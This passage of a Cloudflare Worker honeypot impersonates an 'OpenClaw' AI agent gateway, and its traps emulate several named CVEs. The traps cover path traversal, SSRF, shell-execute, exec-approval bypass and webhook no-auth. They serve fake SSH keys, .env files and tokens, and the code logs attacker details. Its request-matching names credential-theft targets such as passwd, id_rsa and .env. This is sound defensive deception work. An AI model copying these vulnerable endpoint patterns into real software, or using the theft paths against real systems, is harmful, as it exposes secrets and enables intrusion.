      fetch(gwUrl, {method:'POST',headers:{'Content-Type':'application/json','X-OpenClaw-Token':payload.token},body:JSON.stringify(payload),mode:'no-cors'}).catch(function(){});
    };
  } catch(e) {
    fetch(gwUrl, {method:'POST',headers:{'Content-Type':'application/json','X-OpenClaw-Token':payload.token},body:JSON.stringify(payload),mode:'no-cors'}).catch(function(){});
  }
  setTimeout(function(){ window.location.href = '/'; }, 1500);
})();
</script>
<p style="font-family:sans-serif;color:#333;padding:40px">Connecting to gateway...</p>
</body></html>`, { headers: { 'Content-Type': 'text/html; charset=utf-8', 'X-OpenClaw-Version': HONEYPOT_VERSION } });
  }

  // CVE-2026-28464: sessionId / sessionFile path traversal
  const sessionId = url.searchParams.get('sessionId') || url.searchParams.get('session_id');
  const sessionFile = url.searchParams.get('sessionFile') || url.searchParams.get('session_file');
  const traversalParam = sessionId || sessionFile;
  if (traversalParam && (traversalParam.includes('..') || traversalParam.startsWith('/'))) {
    // Serve fake sensitive file based on common traversal targets
    const tp = traversalParam.replace(/\.\.\//g,'').replace(/^\/+/,'');
    let fakeContent = '';
    if (tp.includes('passwd') || tp === 'etc/passwd') fakeContent = FAKE_FS['/etc/passwd'];
    else if (tp.includes('id_rsa') && !tp.includes('.pub')) fakeContent = FAKE_FS['/root/.ssh/id_rsa'];
    else if (tp.includes('bashrc') || tp.includes('bash_history')) fakeContent = FAKE_FS['/root/.bash_history'];
    else if (tp.includes('.env')) fakeContent = FAKE_ENV_OUTPUT;
    else if (tp.includes('openclaw.json') || tp.includes('openclaw')) fakeContent = FAKE_FS['/root/.openclaw/openclaw.json'];
    else if (tp.includes('config')) fakeContent = FAKE_FS['/root/config.json'];
    else fakeContent = `session=${traversalParam}\nstatus=active\nmodel=claude-opus-4-5\ntoken=ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o\n`;
    return new Response(fakeContent, { headers: { 'Content-Type': 'text/plain', 'X-OpenClaw-Version': HONEYPOT_VERSION } });
  }

  // Main dashboard
  if (path === '/' || path === '/index.html') {
    return new Response(htmlDashboard(uptimeMs), { headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'X-OpenClaw-Version': HONEYPOT_VERSION,
      'X-Powered-By': `OpenClaw/${HONEYPOT_VERSION}`,
      'Content-Security-Policy': "default-src 'self' 'unsafe-inline' 'unsafe-eval' https: ws: wss: blob: data:; connect-src *",
      'X-Frame-Options': 'SAMEORIGIN',
    }});
  }

  // Login redirect
  if (path === '/login') {
    if (request.method === 'POST') {
      const body = await request.text().catch(() => '');
      return json({ error: 'invalid_credentials', message: 'Authentication failed.' }, 401);
    }
    return new Response(null, { status: 302, headers: { Location: '/' } });
  }

  // CVE-2026-28472: WebSocket auth bypass — accepts any token, logs the attempt
  if (path === '/ws' || path === '/ws/control' || path === '/api/v1/ws') {
    // Return a realistic WebSocket upgrade rejection with auth token hint
    return new Response(JSON.stringify({
      error: 'websocket_required',
      message: 'Upgrade required. Connect via WebSocket with Authorization header or ?token= query param.',
      hint: 'ws://claw.hxorz.com/ws?token=<gateway_token>',
      docs: 'https://docs.openclaw.ai/gateway/websocket',
      version: HONEYPOT_VERSION,
    }), { status: 426, headers: { ...OCFW_HEADERS, 'Upgrade': 'websocket', 'Connection': 'Upgrade' }});
  }

  // OPTIONS preflight
  if (request.method === 'OPTIONS') {
    return new Response(null, { headers: { 'Access-Control-Allow-Origin': '*', 'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS', 'Access-Control-Allow-Headers': '*' } });
  }

  // robots.txt
  if (path === '/robots.txt') {
    return new Response(`User-agent: *\nDisallow: /api/\nDisallow: /.openclaw/\nDisallow: /.env\nDisallow: /.ssh/\nDisallow: /admin\nDisallow: /webhooks/\n\n# OpenClaw Gateway ${HONEYPOT_VERSION}\n# Sensitive endpoints (do not crawl):\n# /api/v1/keys\n# /api/v1/config\n# /api/v1/shell/execute\n# /api/v1/agent/memory/export\n# /api/v1/exec/execute\n# /api/v1/agent/apply_patch\n# /.openclaw/openclaw.json\n`, { headers: { 'Content-Type': 'text/plain' } });
  }

  // Health endpoint
  if (path === '/health') return json(fakeHealthJSON(uptimeMs));

  // OpenAI-compatible endpoint
  if (path === '/v1/chat/completions') {
    const body = await request.text().catch(() => '{}');
    return json(fakeOpenAICompatResponse(body));
  }

  // Shell execute - POST (with fake execution delay to appear realistic)
  if ((path === '/api/v1/shell/execute' || path === '/api/v1/shell') && request.method === 'POST') {
    const bodyText = await request.text().catch(() => '{}');
    let cmd = '';
    try { cmd = JSON.parse(bodyText).cmd || JSON.parse(bodyText).command || ''; } catch(_){}
    if (!cmd) return json({ error: 'missing_param', message: 'cmd is required' }, 400);
    const result = executeShellCommand(cmd);
    await new Promise(r => setTimeout(r, 80 + Math.floor(Math.random() * 120)));
    return json({ stdout: result.stdout, stderr: result.stderr, exit_code: result.exit_code, session: 'main', timestamp: nowISO() });
  }

  // GHSA-6mgf-v5j7-45cr: Gateway fetch/redirect SSRF trap
  if (path === '/api/v1/gateway/fetch' || path === '/api/v1/gateway/redirect') {
    const targetUrl = url.searchParams.get('url') || url.searchParams.get('target') || url.searchParams.get('redirect') || '';
    const bodyText = request.method === 'POST' ? await request.text().catch(() => '{}') : '{}';
    let bodyTarget = '';
    try { bodyTarget = JSON.parse(bodyText).url || JSON.parse(bodyText).target || ''; } catch(_){}
    const ssrfTarget = targetUrl || bodyTarget;
    // Simulate a real fetch response (with auth header forwarded — the actual vulnerability)
    return json({
      status: 200, ok: true, url: ssrfTarget,
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ forwarded: true, auth_header_forwarded: true, token: 'ocgw-Fk4aX9pZ2mN8rQ1sL6wY3vE5bJ7cA0dUxT2hP9o' }),
      note: 'Authorization header was forwarded to redirect target (CVE GHSA-6mgf-v5j7-45cr)',
    });
  }

  // File traps served as plain text
  if (path === '/.env' || path === '/.env.local' || path === '/.env.production') {
    return new Response(fakeEnvContent(), { headers: { 'Content-Type': 'text/plain', 'X-OpenClaw-Version': HONEYPOT_VERSION } });
  }
  if (path === '/.ssh/id_rsa') {
    return new Response(FAKE_FS['/root/.ssh/id_rsa'], { headers: { 'Content-Type': 'text/plain' } });
  }
  if (path === '/.ssh/id_rsa.pub') {
    return new Response(FAKE_FS['/root/.ssh/id_rsa.pub'], { headers: { 'Content-Type': 'text/plain' } });
  }
  if (path === '/.bash_history') {
    return new Response(FAKE_FS['/root/.bash_history'], { headers: { 'Content-Type': 'text/plain' } });
  }

  // API endpoints
  const respond = trap?.respond;
  if (respond === 'status' || path === '/api/v1/status') return json(fakeStatusJSON(uptimeMs));
  if (respond === 'sessions' || path === '/api/v1/sessions') return json(fakeSessionsJSON());
  if (respond === 'channels' || path === '/api/v1/channels') return json(fakeChannelsJSON());
  if (respond === 'skills' || path === '/api/v1/skills') return json(fakeSkillsJSON());
  if (respond === 'metrics' || path === '/api/v1/metrics') return json(fakeMetricsJSON(uptimeMs));
  if (respond === 'config' || respond === 'openclaw_config' || path === '/.openclaw/openclaw.json' || path === '/config.json') return json(fakeConfigJSON());
  if (respond === 'keys') return json(fakeKeysJSON());
  if (respond === 'logs' || path === '/api/v1/logs') return json(fakeLogsResponse());
  if (respond === 'messages' || path === '/api/agent/sessions/main/messages') return json(fakeMessagesResponse());
  if (respond === 'auth' || path === '/api/v1/auth/login' || path === '/api/v1/auth') {
    return json({ error: 'invalid_credentials', code: 'AUTH_FAILED' }, 401);
  }
  if (respond === 'shell_get') {
    return json({ message: 'POST to /api/v1/shell/execute with {"cmd":"...","session":"main"}', auth: 'Requires elevated session access' });
  }
  if (respond === 'health') return json(fakeHealthJSON(uptimeMs));
  if (respond === 'openai_compat') {
    const b = await request.text().catch(() => '{}');
    return json(fakeOpenAICompatResponse(b));
  }
  if (respond === 'ssh_key') return new Response(FAKE_FS['/root/.ssh/id_rsa'], { headers: { 'Content-Type': 'text/plain' } });
  if (respond === 'ssh_pub') return new Response(FAKE_FS['/root/.ssh/id_rsa.pub'], { headers: { 'Content-Type': 'text/plain' } });
  if (respond === 'bash_history') return new Response(FAKE_FS['/root/.bash_history'], { headers: { 'Content-Type': 'text/plain' } });
  if (respond === 'env') return new Response(fakeEnvContent(), { headers: { 'Content-Type': 'text/plain' } });
  if (respond === 'robots') return new Response(`User-agent: *\nDisallow: /api/\nDisallow: /.env\nDisallow: /.ssh/\n`, { headers: { 'Content-Type': 'text/plain' } });

  // CVE-2026-32060: apply_patch path traversal trap
  if (respond === 'apply_patch' || path === '/api/v1/agent/apply_patch') {
    const bodyText = await request.text().catch(() => '{}');
    let patchData = {};
    try { patchData = JSON.parse(bodyText); } catch(_){}
    return json(fakeApplyPatchResponse(patchData));
  }

  // CVE-2026-28470: exec approvals bypass trap
  if (respond === 'exec_execute' || path === '/api/v1/exec/execute') {
    const bodyText = await request.text().catch(() => '{}');
    let body = {};
    try { body = JSON.parse(bodyText); } catch(_){}
    const cmd = body.command || body.cmd || '';
    return json(fakeExecResponse(cmd));
  }
  if (respond === 'exec_approvals' || path === '/api/v1/exec/approvals') {
    return json(fakeExecApprovalsResponse());
  }

  // CVE-2026-26319: Telnyx / voice webhook no-auth trap
  if (respond === 'webhook_telnyx' || respond === 'webhook_voice' || path === '/webhooks/telnyx' || path === '/webhooks/voice') {
    const bodyText = await request.text().catch(() => '{}');
    let body = {};
    try { body = JSON.parse(bodyText); } catch(_){}
    return json(fakeWebhookResponse(body.event_type || body.data?.event_type));
  }

  // Memory access traps
  if (respond === 'agent_memory' || path === '/api/v1/agent/memory') {
    return json(fakeAgentMemoryResponse());
  }
  if (respond === 'memory_export' || path === '/api/v1/agent/memory/export') {
    return json(fakeMemoryExportResponse());
  }

  // Generic 404 for API paths
  if (path.startsWith('/api/')) {
    return json({ error: 'not_found', message: `Endpoint ${path} not found.`, version: HONEYPOT_VERSION }, 404);
  }

  // Everything else — 404
  return new Response('<!DOCTYPE html><html><head><title>404 Not Found</title><style>body{background:#0a0a0b;color:#e2e2e5;font-family:sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}</style></head><body><div><h1 style="font-size:48px;font-weight:700;color:#252529">404</h1><p style="color:#71717a;margin-top:8px">Page not found</p><p style="margin-top:20px"><a href="/" style="color:#f97316">OpenClaw Gateway</a></p></div></body></html>', {
    status: 404, headers: { 'Content-Type': 'text/html' },
  });
}

// ============================================================
// SECTION 11: MAIN FETCH HANDLER
// ============================================================
export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;
    const ip = getClientIP(request);

    if (path.startsWith('/admin')) return handleAdmin(request, env, url);

    let body = '';
    if (['POST','PUT','PATCH'].includes(request.method)) {
      try { const c = request.clone(); body = truncate(await c.text(), 2000); } catch(_){}
    }

    const attackInfo = analyzeRequest(request, url, body);
    const country = getCountry(request);
    const asn = getASN(request);
    const cfMeta = getCFMeta(request);
    const ua = request.headers.get('User-Agent') || '';
    const referer = request.headers.get('Referer') || '';
    let query = url.search;
    try { query = decodeURIComponent(query.replace(/\+/g,' ')); } catch(_){}

    ctx.waitUntil(logRequest(env, {
      ip, country, asn,
      city: cfMeta.city, region: cfMeta.region, latitude: cfMeta.latitude, longitude: cfMeta.longitude,
      method: request.method, path, query, body, ua, referer,
      headers: getAllHeaders(request),
      attackTypes: attackInfo.types, severity: attackInfo.severity,
      cfRay: cfMeta.cfRay, threatScore: cfMeta.threatScore, botScore: cfMeta.botScore,
    }));

    return handleHoneypot(request, env, url, ip, attackInfo);
  },
};

